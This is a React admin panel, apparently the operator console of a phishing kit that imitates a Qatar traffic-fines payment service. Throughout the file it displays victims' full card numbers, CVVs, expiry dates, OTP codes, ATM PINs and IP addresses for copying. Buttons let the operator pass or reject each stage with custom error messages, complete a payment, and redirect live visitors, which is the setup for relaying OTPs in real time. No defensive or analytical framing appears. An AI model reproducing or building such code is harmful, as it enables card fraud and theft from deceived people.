import { useState, useEffect, useRef } from "react";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  plateNumber: string | null;
  plateSource: string | null;
  plateCode?: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

// ======== الحالات ========
const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  card:         { label: "جديد",              color: "#2563eb", bg: "#dbeafe" },
  card_pending: { label: "انتظار دفع",        color: "#d97706", bg: "#fef3c7" },
  otp:          { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  otp_pending:  { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  atm:          { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  atm_pending:  { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7" },
  failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2" },
};

function StageBadge({ stage }: { stage: Stage }) {
  const cfg = stageConfig[stage] || { label: stage, color: "#6b7280", bg: "#f3f4f6" };
  return (
    <span
      className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold"
      style={{ color: cfg.color, backgroundColor: cfg.bg }}
    >
      {cfg.label}
    </span>
  );
}

// ======== Modal تفاصيل الحجز ========
function BookingDetailModal({
  session,
  token,
  onClose,
  onAction,
}: {
  session: PaymentSession;
  token: string;
  onClose: () => void;
  onAction: (action: "pass" | "denied" | "completed", errorMsg?: string) => void;
}) {
  const [customError, setCustomError] = useState("تم رفض العملية. يرجى المحاولة مرة أخرى.");
  const [copied, setCopied] = useState<string | null>(null);
  const isPending = session.stage.endsWith("_pending");

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(text);
      setTimeout(() => setCopied(null), 2000);
    });
  };

  const InfoRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <span className="text-gray-800 text-sm font-medium text-left">{value || "-"}</span>
    </div>
  );

  const CopyRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-gray-800 text-sm font-mono font-semibold">{value || "-"}</span>
        {value && (
          <button
            onClick={() => copyText(value)}
            className="text-gray-400 hover:text-blue-500 transition p-1 rounded"
            title="نسخ"
          >
            {copied === value ? (
              <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            )}
          </button>
        )}
      </div>
    </div>
  );

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div
        className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto shadow-2xl"
        onClick={e => e.stopPropagation()}
        dir="rtl"
      >
        <div className="flex items-center justify-between p-5 border-b border-gray-200">
          <h3 className="text-gray-800 font-bold text-base">
            تفاصيل الحجز - <span className="text-blue-600 font-mono text-sm">{session.sessionId.slice(0, 16)}</span>
          </h3>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition">
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="p-5 space-y-5">
          <div>
            <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
              <svg className="w-4 h-4 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              بيانات العميل
            </h4>
            <div className="bg-gray-50 rounded-xl px-4">
              <InfoRow label="الاسم" value={session.cardName || "غير محدد"} />
              <InfoRow label="رقم اللوحة" value={session.plateNumber} />
              <InfoRow label="جهة الإصدار" value={session.plateSource} />
              <InfoRow label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} ر.ق` : null} />
              <InfoRow label="IP العميل" value={session.clientIp} />
              <InfoRow label="الحالة" value={stageConfig[session.stage]?.label} />
            </div>
          </div>

          {session.cardNumber && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                </svg>
                بيانات البطاقة
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="اسم الحامل" value={session.cardName} />
                <CopyRow label="رقم البطاقة" value={session.cardNumber} />
                <CopyRow label="تاريخ الانتهاء" value={session.cardExpiry} />
                <CopyRow label="CVV" value={session.cardCvv} />
              </div>
            </div>
          )}

          {session.otpCode && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                رمز OTP
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="رمز OTP" value={session.otpCode} />
              </div>
            </div>
          )}

          {session.atmPin && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-amber-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
                الرقم السري (PIN)
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="PIN" value={session.atmPin} />
              </div>
            </div>
          )}

          {isPending && (
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
              <h4 className="text-amber-700 font-bold text-sm mb-3">⚡ الإجراءات</h4>
              <div className="flex flex-wrap gap-2 mb-3">
                <button
                  onClick={() => onAction("pass")}
                  className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  قبول / التالي
                </button>
                <button
                  onClick={() => onAction("denied", customError)}
                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                  رفض
                </button>
                <button
                  onClick={() => onAction("completed")}
                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  إتمام الدفع
                </button>
              </div>
              <div>
                <label className="text-gray-600 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
                <input
                  type="text"
                  value={customError}
                  onChange={e => setCustomError(e.target.value)}
                  className="w-full border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white"
                />
              </div>
            </div>
          )}

          <div className="bg-gray-50 rounded-xl px-4">
            <InfoRow label="تاريخ الإنشاء" value={new Date(session.createdAt).toLocaleString("ar-QA")} />
            <InfoRow label="آخر تحديث" value={new Date(session.updatedAt).toLocaleString("ar-QA")} />
          </div>
        </div>
      </div>
    </div>
  );
}

// ======== الصفحة الرئيسية ========
export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [notification, setNotification] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);
  const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [redirectSession, setRedirectSession] = useState<PaymentSession | null>(null);
  const [redirectUrl, setRedirectUrl] = useState("");
  const [activeVisitors, setActiveVisitors] = useState(0);
  const wsRef = useRef<WebSocket | null>(null);

  // WebSocket لتتبع الزوار الحقيقيين
  useEffect(() => {
    if (!token) return;
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/visitors?admin=true`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'visitor_count') {
          setActiveVisitors(data.count);
        }
      } catch {}
    };
    return () => {
      ws.close();
    };
  }, [token]);

  const showNotif = (message: string, type: "success" | "error" | "info") => {
    setNotification({ message, type });
    if (notifTimer.current) clearTimeout(notifTimer.current);
    notifTimer.current = setTimeout(() => setNotification(null), 4000);
  };

  // tRPC
  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery(
    { token: token || "" },
    { enabled: !!token, retry: false }
  );
  const statsQuery = trpc.admin.getStats.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 8000 }
  );
  const sessionsQuery = trpc.admin.getSessions.useQuery(
    { token: token || "" },
    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 5000 }
  );
  const sessionDetailQuery = trpc.admin.getSession.useQuery(
    { token: token || "", sessionId: selectedSession?.sessionId || "" },
    { enabled: !!token && !!selectedSession, refetchInterval: 3000 }
  );
  const actionMutation = trpc.admin.action.useMutation();
  const redirectMutation = trpc.admin.redirect.useMutation();

  useEffect(() => {
    if (verifyQuery.data && !verifyQuery.data.valid) {
      localStorage.removeItem("adminToken");
      setToken(null);
    }
  }, [verifyQuery.data]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLoginError("");
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError(err.message || "كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setToken(null);
  };

  const handleAction = async (action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!selectedSession || !token) return;
    try {
      const res = await actionMutation.mutateAsync({
        token,
        sessionId: selectedSession.sessionId,
        action,
        errorMessage: errorMsg,
      });
      showNotif(
        `تم تنفيذ الإجراء بنجاح`,
        "success"
      );
      setSelectedSession(null);
      sessionsQuery.refetch();
      statsQuery.refetch();
    } catch (err: any) {
      showNotif(err.message || "حدث خطأ", "error");
    }
  };

  if (!token || verifyQuery.data?.valid === false) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-[#0f172a]" dir="rtl">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-sm">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg text-white">
              <svg className="w-9 h-9" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h2 className="text-gray-800 text-xl font-bold">نظام مخالفات قطر</h2>
            <p className="text-gray-500 text-sm mt-1">لوحة التحكم الإدارية</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="text-gray-600 text-sm block mb-1.5 font-medium">كلمة المرور</label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  className="w-full border border-gray-300 text-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100"
                />
              </div>
            </div>

            {loginError && <p className="text-red-600 text-sm text-center">{loginError}</p>}

            <button
              type="submit"
              disabled={loginMutation.isPending}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition shadow-md"
            >
              {loginMutation.isPending ? "جاري الدخول..." : "تسجيل الدخول"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const allSessions: PaymentSession[] = sessionsQuery.data || [];
  const filteredSessions = allSessions.filter(s => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (
      (s.sessionId || "").toLowerCase().includes(q) ||
      (s.plateNumber || "").toLowerCase().includes(q) ||
      (s.clientIp || "").toLowerCase().includes(q)
    );
  });

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {notification && (
        <div className={`fixed top-4 right-4 z-[100] rounded-xl px-4 py-3 shadow-lg text-white text-sm font-medium ${notification.type === "success" ? "bg-green-600" : "bg-red-600"}`}>
          {notification.message}
        </div>
      )}

      {selectedSession && token && (
        <BookingDetailModal
          session={sessionDetailQuery.data || selectedSession}
          token={token}
          onClose={() => setSelectedSession(null)}
          onAction={handleAction}
        />
      )}

      {redirectSession && token && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md p-6">
            <h3 className="text-gray-800 font-bold text-base mb-4">توجيه العميل</h3>
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-2">
                {[{ label: "🏠 الرئيسية", url: "/" }, { label: "💳 الدفع", url: "/payment" }].map(page => (
                  <button
                    key={page.url}
                    onClick={() => setRedirectUrl(page.url)}
                    className={`px-3 py-2 rounded-lg text-sm border ${redirectUrl === page.url ? "bg-purple-600 text-white" : "bg-gray-50"}`}
                  >
                    {page.label}
                  </button>
                ))}
              </div>
              <input
                type="text"
                value={redirectUrl}
                onChange={e => setRedirectUrl(e.target.value)}
                placeholder="رابط مخصص..."
                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm"
              />
              <div className="flex gap-2">
                <button
                  onClick={async () => {
                    await redirectMutation.mutateAsync({ token, sessionId: redirectSession.sessionId, redirectUrl });
                    showNotif("تم التوجيه", "success");
                    setRedirectSession(null);
                  }}
                  className="flex-1 bg-purple-600 text-white py-2 rounded-xl font-bold"
                >
                  توجيه
                </button>
                <button onClick={() => setRedirectSession(null)} className="px-4 py-2 bg-gray-100 rounded-xl">إلغاء</button>
              </div>
            </div>
          </div>
        </div>
      )}

      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white">
            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <div>
            <h1 className="text-gray-800 font-bold text-sm">نظام مخالفات قطر</h1>
            <p className="text-blue-600 text-xs font-semibold">لوحة التحكم</p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-green-600 text-xs font-medium">● متصل</span>
          <button onClick={handleLogout} className="bg-red-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold">خروج</button>
        </div>
      </header>

      <div className="p-6">
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
          {[
            { label: "إجمالي العمليات", value: statsQuery.data?.total || 0, color: "text-blue-600", bg: "bg-blue-50" },
            { label: "عمليات جديدة", value: statsQuery.data?.new || 0, color: "text-orange-600", bg: "bg-orange-50" },
            { label: "مكتملة", value: statsQuery.data?.completed || 0, color: "text-green-600", bg: "bg-green-50" },
            { label: "قيد المعالجة", value: statsQuery.data?.pending || 0, color: "text-yellow-600", bg: "bg-yellow-50" },
            { label: "زوار متصلون", value: activeVisitors, color: "text-purple-600", bg: "bg-purple-50" },
          ].map((stat, i) => (
            <div key={i} className="bg-white rounded-xl p-4 border border-gray-100 shadow-sm">
              <div className={`text-2xl font-bold ${stat.color}`}>{stat.value}</div>
              <div className="text-gray-500 text-xs">{stat.label}</div>
            </div>
          ))}
        </div>

        <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-4 border-b border-gray-100 flex justify-between items-center">
            <h2 className="font-bold">قائمة العمليات</h2>
            <input
              type="text"
              placeholder="بحث..."
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              className="border rounded-lg px-3 py-1.5 text-sm w-48"
            />
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-sm text-right">
              <thead className="bg-gray-50">
                <tr>
                  <th className="p-3">المبلغ</th>
                  <th className="p-3">رقم اللوحة</th>
                  <th className="p-3">المصدر</th>
                  <th className="p-3">الحالة</th>
                  <th className="p-3">التاريخ</th>
                  <th className="p-3">الإجراءات</th>
                </tr>
              </thead>
              <tbody>
                {filteredSessions.map(s => (
                  <tr key={s.sessionId} className="border-b hover:bg-gray-50">
                    <td className="p-3 font-bold text-blue-600">{s.totalAmount} ر.ق</td>
                    <td className="p-3 font-mono">{s.plateNumber}</td>
                    <td className="p-3">{s.plateSource}</td>
                    <td className="p-3"><StageBadge stage={s.stage} /></td>
                    <td className="p-3 text-gray-500 text-xs">{new Date(s.createdAt).toLocaleString("ar-QA")}</td>
                    <td className="p-3 flex gap-2">
                      <button onClick={() => setSelectedSession(s)} className="bg-blue-600 text-white px-3 py-1 rounded-lg text-xs">تفاصيل</button>
                      <button onClick={() => { setRedirectSession(s); setRedirectUrl(""); }} className="bg-purple-100 text-purple-700 px-3 py-1 rounded-lg text-xs">توجيه</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
